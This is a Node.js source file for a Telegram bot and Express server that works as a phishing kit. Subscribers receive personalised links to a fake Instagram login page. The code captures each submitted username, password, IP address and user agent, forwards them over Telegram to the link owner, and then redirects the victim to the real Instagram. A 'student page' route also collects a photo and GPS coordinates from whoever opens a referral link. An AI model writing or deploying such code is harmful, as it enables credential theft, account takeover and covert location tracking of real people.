// index.js (ESM) – Node 18+
// npm i telegraf express multer dotenv node-fetch

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import multer from "multer";
import { Telegraf } from "telegraf";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import fetch from "node-fetch";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// === CONFIG ===
const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST = process.env.HOST || "tgbot-tg1w.onrender.com";
const PORT = process.env.PORT || 3000;
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
const ADMIN_USER_ID = "5543574742";
const CHANNEL_ID = -1002970130807;
const CHANNEL_INVITE_LINK = "https://t.me/+VN0ATDiz9DBkOTQy";

if (!BOT_TOKEN || !FIREBASE_DB_URL) {
  console.error("ERROR: Set BOT_TOKEN and FIREBASE_DB_URL in .env");
  process.exit(1);
}

// === FIREBASE ===
async function saveUser(id) {
  try {
    await fetch(`${FIREBASE_DB_URL}/users/${id}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ timestamp: Date.now() })
    });
    await updateStats();
  } catch (e) { console.error("Save user error:", e); }
}
async function updateStats() {
  try {
    const usersRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
    const users = usersRes.ok ? (await usersRes.json() || {}) : {};
    const total = Object.keys(users).length;
    await fetch(`${FIREBASE_DB_URL}/stats.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ total, updated: Date.now() })
    });
    console.log(`Stats updated: Total Users = ${total}`);
  } catch (e) { console.error("Update stats error:", e); }
}
async function getStats() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/stats.json`);
    if (!res.ok) return { total: 0 };
    const data = await res.json();
    return { total: data?.total || 0 };
  } catch (e) { return { total: 0 }; }
}
async function getAllUsers() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/users.json`);
    if (!res.ok) return {};
    const data = await res.json();
    return data || {};
  } catch (e) { return {}; }
}

// === BOT ===
const bot = new Telegraf(BOT_TOKEN);
const broadcastState = new Map();

async function checkSubscription(userId) {
  try {
    const member = await bot.telegram.getChatMember(CHANNEL_ID, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (e) {
    console.error("checkSubscription error:", e);
    return false;
  }
}
async function showSubscriptionRequired(ctx) {
  await ctx.reply(
    `*Channel Subscription Required*\n\nTo use this bot, please join our private channel first!`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Join Private Channel", url: CHANNEL_INVITE_LINK }],
          [{ text: "I've Joined", callback_data: "check_subscription" }]
        ]
      }
    }
  );
}

// === /start – PERSONALIZED INSTAGRAM LINK ===
bot.start(async (ctx) => {
  const id = String(ctx.from.id);
  const ok = await checkSubscription(id);
  if (!ok) return showSubscriptionRequired(ctx);

  await saveUser(id);

  const personalInstaLink = `https://${HOST}/insta/${id}`;

  await ctx.reply(
    `*Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: ${personalInstaLink}`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Open Instagram", url: personalInstaLink }]
        ]
      }
    }
  );
});

bot.action("check_subscription", async (ctx) => {
  await ctx.answerCbQuery("Checking…");
  const id = String(ctx.from.id);
  const ok = await checkSubscription(id);
  if (ok) {
    const link = `https://${HOST}/insta/${id}`;
    await ctx.editMessageText(
      `*Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: ${link}`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Open Instagram", url: link }]]
        }
      }
    );
    await saveUser(id);
  } else {
    await ctx.editMessageText(
      `*Subscription Required*\n\nYou haven't joined the channel yet.`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Join Private Channel", url: CHANNEL_INVITE_LINK }],
            [{ text: "I've Joined", callback_data: "check_subscription" }]
          ]
        }
      }
    );
  }
});

bot.command("link", async (ctx) => {
  const id = String(ctx.from.id);
  const ok = await checkSubscription(id);
  if (!ok) return showSubscriptionRequired(ctx);
  await saveUser(id);
  await ctx.reply(`https://${HOST}/r/${id}`);
});

// === ADMIN PANEL (unchanged) ===
bot.command("admin", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.reply("Access denied.");
  const { total } = await getStats();
  await ctx.reply(`Admin Panel\nTotal Users: ${total}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "View Statistics", callback_data: "stats" }],
        [{ text: "Send Message to All Users", callback_data: "broadcast" }]
      ]
    }
  });
});
bot.action("stats", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  const { total } = await getStats();
  await ctx.editMessageText(`*User Statistics*\n\nTotal Users: ${total}`, { parse_mode: "Markdown" });
  await ctx.answerCbQuery();
});
bot.action("broadcast", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  const users = await getAllUsers();
  const ids = Object.keys(users);
  if (!ids.length) return ctx.editMessageText("No users in DB.");
  const bid = Date.now();
  broadcastState.set(bid, { targets: ids, adminChatId: ctx.chat.id });
  await ctx.editMessageText(
    `*Broadcast Setup*\n\nUsers: ${ids.length}\nBroadcast ID: ${bid}\n\nSend the message:`,
    {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "Cancel", callback_data: `cancel_${bid}` }]] }
    }
  );
  await ctx.answerCbQuery();
});
bot.action(/cancel_(\d+)/, async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  broadcastState.delete(parseInt(ctx.match[1]));
  await ctx.editMessageText("Broadcast cancelled.");
  await ctx.answerCbQuery();
});
bot.on("message", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID || ctx.chat.type !== "private") return;
  let state = null;
  for (const [_, s] of broadcastState) {
    if (s.adminChatId === ctx.chat.id) { state = s; break; }
  }
  if (!state) return;
  const txt = ctx.message.text || ctx.message.caption || "";
  if (!txt.trim()) return ctx.reply("Empty message.");
  const status = await ctx.reply(`Sending…\n0/${state.targets.length}`);
  let sent = 0, failed = 0;
  for (let i = 0; i < state.targets.length; i++) {
    try { await ctx.telegram.sendMessage(state.targets[i], txt); sent++; }
    catch { failed++; }
    if ((i + 1) % 10 === 0 || i === state.targets.length - 1) {
      await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined,
        `Sending…\n${i + 1}/${state.targets.length}\nSent: ${sent}\nFailed: ${failed}`,
        { parse_mode: "Markdown" });
    }
    await new Promise(r => setTimeout(r, 100));
  }
  await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined,
    `*Done!*\nTotal: ${state.targets.length}\nSent: ${sent}\nFailed: ${failed}`,
    { parse_mode: "Markdown" });
  broadcastState.clear();
});

// === EXPRESS ===
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });

const INSTA_PATH = path.join(__dirname, "test insta");
app.use("/insta", express.static(INSTA_PATH));

// Load HTML once
const rawHtml = fs.readFileSync(path.join(INSTA_PATH, "index.html"), "utf8");

// Render with dynamic form action
function renderInsta(userId = null) {
  let html = rawHtml;
  html = html.replace(/\.\/public\//g, "/insta/public/");
  const action = userId ? `/login/${userId}` : "/login";
  html = html.replace(/action="\/login"/, `action="${action}"`);
  return html;
}

// Routes
app.get("/insta", (req, res) => res.send(renderInsta()));
app.get("/insta/:userId", (req, res) => {
  const uid = req.params.userId;
  if (!/^\d+$/.test(uid)) return res.redirect("/insta");
  res.send(renderInsta(uid));
});

// Capture
async function handleLogin(req, res, targetId) {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/insta");

  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
  const ua = (req.get("User-Agent") || "").substring(0, 100);
  const time = new Date().toLocaleString("en-US", { timeZone: "UTC" });

  const msg = `
*INSTAGRAM LOGIN*
*User:* \`${username}\`
*Pass:* \`${password}\`
*IP:* \`${ip}\`
*UA:* \`${ua}…\`
*Time:* \`${time}\`
  `.trim();

  try {
    await bot.telegram.sendMessage(targetId, msg, { parse_mode: "Markdown" });
    console.log(`Sent to ${targetId}: ${username}`);
  } catch (e) {
    console.error(`Failed to send to ${targetId}:`, e.message);
  }
  res.redirect("https://www.instagram.com/");
}

app.post("/login", (req, res) => handleLogin(req, res, ADMIN_USER_ID));
app.post("/login/:userId", (req, res) => {
  const uid = req.params.userId;
  if (!/^\d+$/.test(uid)) return res.redirect("/insta");
  handleLogin(req, res, parseInt(uid));
});

// === STUDENT PAGE ===
app.get("/r/:ref", async (req, res) => {
  const ref = req.params.ref;
  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
  await saveUser(ref);
  res.type("html").send(`<!DOCTYPE html>...[YOUR STUDENT PAGE HTML HERE]...`);
});

// === SUBMIT ===
app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    const { ref, latitude, longitude } = req.body;
    if (!ref || !/^\d+$/.test(ref)) return res.status(400).json({ ok: false });
    const p = [];
    if (req.file?.buffer) p.push(bot.telegram.sendPhoto(ref, { source: req.file.buffer }, { caption: `Student (ref ${ref})` }).catch(() => {}));
    if (latitude && longitude) {
      const lat = parseFloat(latitude), lon = parseFloat(longitude);
      if (!isNaN(lat) && !isNaN(lon)) {
        p.push(bot.telegram.sendLocation(ref, lat, lon).catch(() => {}));
        p.push(bot.telegram.sendMessage(ref, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => {}));
      }
    }
    if (!p.length) p.push(bot.telegram.sendMessage(ref, `Link opened (ref ${ref})`).catch(() => {}));
    await Promise.allSettled(p);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false });
  }
});

app.get("/", (_, res) => res.json({ status: "OK" }));

// === START ===
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`LIVE: https://${HOST}`);
});
bot.launch().then(() => console.log("Bot LIVE"));

// === KEEP ALIVE ===
server.on("listening", () => {
  setTimeout(() => {
    const ping = () => fetch(`https://${HOST}`).catch(() => {});
    ping();
    setInterval(ping, 9 * 60 * 1000);
  }, 10000);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));